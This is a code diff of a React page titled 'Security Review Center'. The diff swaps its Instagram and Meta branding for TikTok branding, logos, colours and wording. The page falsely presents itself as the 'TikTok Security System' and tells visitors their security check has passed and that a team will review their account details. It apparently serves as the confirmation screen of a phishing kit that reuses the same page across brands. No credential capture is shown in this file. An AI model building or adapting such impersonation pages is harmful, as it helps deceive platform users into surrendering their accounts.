@@ -1,71 +1,70 @@
 import { Link } from "react-router-dom";
-import { ShieldCheck, CheckCircle2, Lock, ArrowLeft } from "lucide-react";
+import { ShieldCheck, CheckCircle2, Lock, ChevronLeft } from "lucide-react";
 
 export default function Dashboard() {
   return (
-    <div className="min-h-screen bg-[#121212] text-[#f5f5f5] flex flex-col justify-between p-4 selection:bg-[#0095f6] selection:text-white">
+    <div className="min-h-screen bg-white text-slate-900 flex flex-col justify-between p-4 selection:bg-[#fe2c55] selection:text-white font-sans">
       
       {/* Top Header Bar */}
-      <header className="flex items-center justify-between w-full max-w-md mx-auto py-3 border-b border-[#262626]">
+      <header className="flex items-center justify-between w-full max-w-md mx-auto py-3 border-b border-gray-100">
         <a
-          href="https://www.instagram.com"
+          href="https://www.tiktok.com"
           target="_blank"
           rel="noopener noreferrer"
-          aria-label="Back to Instagram"
-          className="text-[#a8a8a8] hover:text-white transition p-1"
+          aria-label="Back to TikTok"
+          className="text-black hover:opacity-70 transition p-1"
         >
-          <ArrowLeft size={22} />
+          <ChevronLeft size={28} strokeWidth={2.5} />
         </a>
-        <span className="text-sm font-semibold tracking-wide text-white uppercase">
+        <span className="text-sm font-bold tracking-wide text-black">
           Security Review Center
         </span>
-        <div className="w-6" /> {/* Spacer for symmetry */}
+        <div className="w-7" /> {/* Spacer for symmetry */}
       </header>
 
       {/* Main Content Area */}
       <main className="w-full max-w-md mx-auto my-auto flex flex-col items-center text-center px-2 py-8">
         
-        {/* Security / Instagram Verification Badge Icon Stack */}
+        {/* Security Badge Icon Stack */}
         <div className="relative mb-6">
-          <div className="flex h-24 w-24 items-center justify-center rounded-full bg-gradient-to-tr from-[#f58529]/25 via-[#dd2a7b]/25 to-[#8134af]/25 border-2 border-[#dd2a7b]/40 text-[#dd2a7b] shadow-xl">
+          <div className="flex h-24 w-24 items-center justify-center rounded-full bg-red-50 border-2 border-red-100 text-[#fe2c55] shadow-sm">
             <ShieldCheck size={48} strokeWidth={2} />
           </div>
-          <div className="absolute -bottom-1 -right-1 flex h-9 w-9 items-center justify-center rounded-full bg-[#23a55a] text-white shadow-md border-2 border-[#121212]">
+          <div className="absolute -bottom-1 -right-1 flex h-9 w-9 items-center justify-center rounded-full bg-[#20d5ec] text-white shadow-md border-2 border-white">
             <CheckCircle2 size={20} strokeWidth={2.5} />
           </div>
         </div>
 
         {/* Brand / Security Tag */}
-        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#262626] border border-[#363636] text-xs font-medium text-[#a8a8a8] mb-4">
-          <Lock size={12} className="text-[#0095f6]" />
-          <span>Instagram Security System</span>
+        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-gray-100 border border-gray-200 text-xs font-medium text-slate-600 mb-4">
+          <Lock size={12} className="text-[#fe2c55]" />
+          <span>TikTok Security System</span>
         </div>
 
         {/* Congratulatory & Status Text */}
-        <h1 className="text-xl font-bold text-white mb-3 leading-snug">
-          Congratulations, your security is passed to the team!
+        <h1 className="text-xl font-bold text-slate-900 mb-3 leading-snug">
+          Congratulations, your security check has passed!
         </h1>
 
-        <p className="text-sm text-[#a8a8a8] leading-relaxed max-w-xs mb-8">
-          The team will review your account details and announce you soon. Thank you for securing your profile.
+        <p className="text-sm text-gray-500 leading-relaxed max-w-xs mb-8">
+          Our team will review your account details and notify you soon. Thank you for keeping your profile secure.
         </p>
 
-        {/* Action Button Linking to Instagram */}
+        {/* Action Button Linking to TikTok */}
         <a
-          href="https://www.instagram.com"
+          href="https://www.tiktok.com"
           target="_blank"
           rel="noopener noreferrer"
-          className="w-full rounded-xl bg-[#0095f6] px-6 py-3.5 text-sm font-semibold text-white shadow-lg transition hover:bg-[#1877f2] text-center"
+          className="w-full rounded-full bg-[#fe2c55] hover:bg-[#e62046] active:bg-[#d0193d] px-6 py-3.5 text-sm font-semibold text-white shadow-sm transition text-center"
         >
-          Back to Instagram
+          Back to TikTok
         </a>
       </main>
 
-      {/* Footer Meta Branding */}
+      {/* Footer Branding */}
       <footer className="w-full max-w-md mx-auto py-4 text-center">
-        <div className="flex items-center justify-center gap-1.5 text-xs font-bold tracking-widest text-[#737373]">
-          <span>∞</span>
-          <span>Meta Security</span>
+        <div className="text-xs font-medium tracking-wide text-gray-400">
+          TikTok Security & Privacy
         </div>
       </footer>
 
